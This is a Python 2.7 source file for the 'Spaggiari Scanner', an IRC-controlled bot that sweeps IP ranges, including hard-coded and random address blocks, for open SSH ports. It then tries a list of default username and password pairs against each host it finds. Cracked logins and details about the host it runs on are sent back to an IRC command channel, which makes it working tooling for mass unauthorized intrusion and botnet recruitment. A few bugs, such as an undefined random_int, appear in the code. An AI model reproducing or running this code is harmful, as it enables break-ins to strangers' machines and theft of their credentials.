#!/usr/bin/env python
# Spaggiari Scanner - Version 1.0b
# Developed by acidvegas in Python 2.7
# https://github.com/acidvegas/spaggiari
# spaggiari.py

"""
'sans armes, ni haine, ni violence'

Requirments:
 - Python 2.7       (http://www.python.org/)
 - Paramiko Library (http://www.paramiko.org/)

Commands:
 - @help      | A list of commands, syntax, and descriptions.
 - @info      | Information about the server.
 - @kill      | Kill the bot.
 - @scan      | Scan every in IP address in the range arguments.
 - @status    | Check the scanning status on thr bot.
 - @stop      | Stop all current running scans.
 - @version   | Information about the scanner.


 ToDo:
- Fix up the @scan and @stop commands.
"""

import datetime
import getpass
import os
import platform
import random
import re
import socket
import ssl
import sys
import threading
import time
import urllib2

# Main IRC Config
server   = 'irc.server.com'
port     = 6697
use_ssl  = True
password = None
channel  = '#dev'
key      = None

# Other Config
admin_host   = 'server.admin'
control_char = '@'
throttle     = 20

# SSH Login Attempts
combos = [
    'root:root',
    'root:toor',
    'root:admin',
    'root:changeme',
    'root:pass',
    'root:password',
    'admin:1234',
    'admin:12345',
    'admin:123456',
    'admin:4321',
    'admin:9999',
    'admin:admin',
    'admin:password',
    'Admin:123456',
    'cisco:cisco',
    'oracle:oracle',
    'pi:raspberry',
    'admin:aerohive',
    'default:defaultpassword',
    'root:alpine',
    'root:openelec',
    'ubnt:ubnt',
    'user:acme',
    'vyos:vyos',
]

lucky = ['113.53','117.156','118.173','118.174','122.168','122.176','165.229','177.11','182.74','186.113','186.114','186.115','186.119','187.109','188.59','190.252','190.253','190.254','190.255','190.65','190.66','190.67','190.68','190.69','201.75','203.249','31.176','60.51','84.122''95.169','95.6','95.9']

# Formatting Control Characters
bold        = '\x02'
colour      = '\x03'
italic      = '\x1D'
underline   = '\x1F'
reverse     = '\x16'
reset       = '\x0f'

# Color Codes
white       = '00'
black       = '01'
blue        = '02'
green       = '03'
red         = '04'
brown       = '05'
purple      = '06'
orange      = '07'
yellow      = '08'
light_green = '09'
cyan        = '10'
light_cyan  = '11'
light_blue  = '12'
pink        = '13'
grey        = '14'
light_grey  = '15'

# Debug Functions
def action(msg):
    print '%s | [#] - %s' % (get_time(), msg)

def alert(msg):
    print '%s | [+] - %s' % (get_time(), msg)

def check_ip(ip):
    return re.match('^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$', ip)

def check_root():
    if os.getuid() == 0 or os.geteuid() == 0:
        return True
    else:
        return False

def check_version(major, minor):
    if sys.version_info.major == major and sys.version_info.minor == minor:
        return True
    else:
        return False

def debug(msg):
    print '%s | [~] - %s' % (get_time(), msg)

def error(msg, reason=None):
    if reason:
        print '%s | [!] - %s (%s)' % (get_time(), msg, reason)
    else:
        print '%s | [!] - %s'      % (get_time(), msg)

def error_exit(msg):
    raise SystemExit('%s | [!] - %s' % (get_time(), msg))

def get_time():
    return datetime.datetime.now().strftime('%I:%M:%S')

def get_windows():
    if os.name == 'nt':
        return True
    else:
        return False

def keep_alive():
    try:
        while True : raw_input('')
    except KeyboardInterrupt:
        sys.exit()



# Information
def get_arch()     : return ' '.join(platform.architecture())
def get_dist()     : return ' '.join(platform.linux_distribution())
def get_home()     : return os.environ['HOME']
def get_hostname() : return socket.gethostname()

def get_ip():
    try    : return re.findall(r'[0-9]+(?:\.[0-9]+){3}', urllib2.urlopen('http://checkip.dyndns.com/').read())[0]
    except : return 'Unknown IP Address'

def get_kernel()   : return platform.release()
def get_username() : return getpass.getuser()



# Functions
def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        code = sock.connect_ex((ip, port))
        if code == 0 : return True
        else         : return False
    except socket.error:
        return False
    finally:
        sock.close()

def color(msg, foreground, background=None):
    if background : return '%s%s,%s%s%s' % (colour, foreground, background, msg, reset)
    else          : return '%s%s%s%s'    % (colour, foreground, msg, reset)

def ip_range(start_ip, end_ip):
    start = list(map(int, start_ip.split('.')))
    end   = list(map(int, end_ip.split('.')))
    temp  = start
    ip_range = []
    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
           if temp[i] == 256:
              temp[i] = 0
              temp[i-1] += 1
        ip_range.append('.'.join(map(str, temp)))
    return ip_range

def random_str(size) : return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))

class ssh_bruteforce(threading.Thread):
    def __init__(self, host):
        self.host = host
        threading.Thread.__init__(self)
    def run(self):
        if check_port(self.host, 22):
            alert('%s has port 22 open. (ssh)' % self.host)
            SpaggiariBot.sendmsg(channel, '[%s] - %s has port 22 open. %s' % (color('+', green), self.host, color('(ssh)', grey)))
            for item in combos:
                user   = item.split(':')[0]
                passwd = item.split(':')[1]
                try:
                    ssh.connect(hostname=self.host, port=22, username=user, password=passwd, timeout=10.0, allow_agent=False, look_for_keys=False, banner_timeout=10.0)
                    SpaggiariBot.sendmsg(channel, '[%s] - %s using %s:%s' % (color('+', green), self.host, user, passwd))
                    break
                except paramiko.ssh_exception.AuthenticationException:
                    error('Failed to connect to %s using %s:%s (Authentication Error)' % (self.host, user, passwd))
                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (Authentication Error)' % (self.host, user, passwd))
                except paramiko.ssh_exception.BadHostKeyException:
                    error('Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (self.host, user, passwd))
                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (self.host, user, passwd))
                except paramiko.ssh_exception.SSHException:
                    error('Failed to connect to %s using %s:%s (SSH Exception)' % (self.host, user, passwd))
                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (SSH Exception)' % (self.host, user, passwd))
                except socket.error as ex:
                    error('Failed to connect to %s using %s:%s (%s)' % (self.host, user, passwd, str(ex)))
                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (%s)' % (self.host, user, passwd, str(ex)))
                except Exception as ex:
                    error('Failed to connect to %s using %s:%s (%s)' % (self.host, user, passwd, str(ex)))
                    SpaggiariBot.sendmsg(channel, 'Failed to connect to %s using %s:%s (!!!%s)' % (self.host, user, passwd, str(ex)))
                finally:
                    ssh.close()
                time.sleep(throttle)
        else:
            error('%s does not have port 22 open. (ssh)' % self.host)

def scan(ip_range):
    for ip in ip_range:
        ssh_bruteforce(ip).start()
        time.sleep(0.5)
        while threading.activeCount() >= 100:
            time.sleep(10)

# IRC Bot Object
class IRC(object):
    def __init__(self, server, port, use_ssl, password, channel, key, nick, username, realname):
        self.server   = server
        self.port     = port
        self.use_ssl  = use_ssl
        self.password = password
        self.channel  = channel
        self.key      = key
        self.nickname = nickname
        self.username = username
        self.realname = realname
        self.id       = nick[-5:]
        self.sock     = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.scanning = False

    def action(self, chan, msg):
        self.sendmsg(chan, '\x01ACTION %s\x01' % msg)

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.use_ssl: self.sock = ssl.wrap_socket(self.sock)
            self.sock.connect((self.server, self.port))
            if self.password : self.raw('PASS ' + self.password)
            self.raw('USER %s 0 * :%s' % (self.username, self.realname))
            self.nick(self.nickname)
            self.listen()
        except Exception as ex:
            error('Failed to connect to IRC server.', ex)
            self.event_disconnect()

    def disconnect(self):
        if self.sock != None:
            try    : self.sock.shutdown(socket.SHUT_RDWR)
            except : pass
            self.sock.close()
            self.sock = None

    def event_connect(self):
        self.mode(self.nickname, '+B')
        self.join(self.channel, self.key)
        
    def event_disconnect(self):
        self.disconnect()
        time.sleep(5)
        self.connect()

    def event_kick(self, nick, chan, kicked, reason):
        if kicked == self.nickname and chan == self.channel:
            self.join(chan, self.key)
            
    def event_message(self, nick, host, chan, msg):
        if (not nick.startswith('spag-') or not nick.startswith('rspag-')) and host == admin_host:
            args = msg.split()
            cmd  = args[0].replace(control_char, '', 1)
            if len(args) == 2:
                if cmd == 'help' and args[1] == self.id:
                    self.sendmsg(chan, color('@help',    yellow) + reset + ' - A list of commands and descriptions.')
                    self.sendmsg(chan, color('@info',    yellow) + reset + ' - Information about the server.')
                    self.sendmsg(chan, color('@kill',    yellow) + reset + ' - Kill the bot.')
                    self.sendmsg(chan, color('@scan',    yellow) + reset + ' - Scan every in IP address in the range arguments.')
                    self.sendmsg(chan, color('@status',  yellow) + reset + ' - Check the scanning status on the bot.')
                    self.sendmsg(chan, color('@stop',    yellow) + reset + ' - Stop all current running scans.')
                    self.sendmsg(chan, color('@version', yellow) + reset + ' - Information about the scanner.')
                if args[1] == 'all' or args[1] == self.id:
                    if cmd == 'info':
                        self.sendmsg(chan, '%s@%s (%s) | %s %s | %s' % (get_username(), get_hostname(), get_ip(), get_dist(), get_arch(), get_kernel()))
                    elif cmd == 'kill':
                        self.quit('KILLED')
                        sys.exit()
                    elif cmd == 'stop':
                        if self.scanning:
                            self.scanning = False
                            self.action(chan, 'Stopped all running scans.')
                    elif cmd == 'version':
                        self.sendmsg(chan, bold + 'Spaggiari Scanner - Version 1.0.0 - Developed by acidvegas in Python 2.7 - https://github.com/acidvegas/spaggiari/')    
            elif len(args) >= 3:
                if cmd == 'scan' and args[1] == self.id:
                    if not self.scanning:
                        if args[2] == 'lucky':
                            lucky_range = random.choice(lucky)
                            start       = lucky_range + '.0.0'
                            end         = lucky_range + '.255.255'
                        elif args[2] == 'random':
                            random_range = random_int(1,255) + '.' + random_int(0,255)
                            start        = random_range + '.0.0'
                            end          = random_range + '.255.255'
                        else:
                            start = args[2]
                            end   = args[3]
                        if check_ip(start) and check_ip(end):
                            targets = ip_range(start, end)
                            self.sendmsg(chan, '[%s] - Scanning %s IP addresses in range...' % (color('#', blue), '{:,}'.format(len(targets))))
                            scan(targets)
                            self.sendmsg(chan, '[%s] - Scan has completed. %s' % (color('#', blue), color('(Threads still may be running.)', grey)))
                        else:
                            self.sendmsg(chan, '[%s] - Invalid IP address range.' % color('ERROR', red))
                    else:
                        self.sendmsg(chan, '[%s] - A scan is already running.' % color('ERROR', red))

    def handle_events(self, data):
        args = data.split()
        if   args[0] == 'PING' : self.raw('PONG ' + args[1][1:])
        elif args[1] == '001'  : self.event_connect()
        elif args[1] == '433'  :
            self.id       = random_str(5)
            self.nickname = self.nickname[:-5] + self.id
            self.nick(self.nickname)
        elif args[1] in ['KICK', 'PRIVMSG']:
            name = args[0].split('!')[0][1:]
            if name != self.nickname:
                if args[1] == 'KICK':
                    chan   = args[2]
                    kicked = args[3]
                    self.event_kick(name, chan, kicked)
                elif args[1] == 'PRIVMSG':
                    host = args[0].split('!')[1].split('@')[1]
                    chan = args[2]
                    msg  = data.split(args[1] + ' ' + chan + ' :')[1]
                    if chan == self.channel:
                        self.event_message(name, host, chan, msg)

    def join(self, chan, key=None):
        if key : self.raw('JOIN %s %s' % (chan, key))
        else   : self.raw('JOIN ' + chan)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024)
                for line in data.split('\r\n'):
                    if line:
                        debug(line)
                        if len(line.split()) >= 2:
                            self.handle_events(line)
                if 'Closing Link' in data and self.nickname in data : break
            except Exception as ex:
                error('Unexpected error occured.', ex)
                break
        self.event_disconnect()

    def mode(self, target, mode):
        self.raw('MODE %s %s' % (target, mode))

    def nick(self, nick):
        self.raw('NICK ' + nick)

    def quit(self, msg=None):
        if msg : self.raw('QUIT :' + msg)
        else   : self.raw('QUIT')

    def raw(self, msg):
        self.sock.send(msg + '\r\n')

    def sendmsg(self, target, msg):
        self.raw('PRIVMSG %s :%s' % (target, msg))

# Main
if not check_version(2,7):
    error_exit('Spaggiari Scanner requires Python version 2.7 to run!')
if get_windows():
    error_exit('Spaggiari Scanner must be ran on a Linux OS!')
try:
    import paramiko
except ImportError:
    error_exit('Failed to import the Paramiko library! (http://www.paramiko.org/)')
paramiko.util.log_to_file('/dev/null')
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
nickname = 'spag-' + random_str(5)
if check_root(): nickname = 'r' + nickname
SpaggiariBot = IRC(server, port, use_ssl, password, channel, key, nickname, random_str(5), 'Spaggiari Scanner IRC Bot')
SpaggiariBot.connect()
keep_alive()
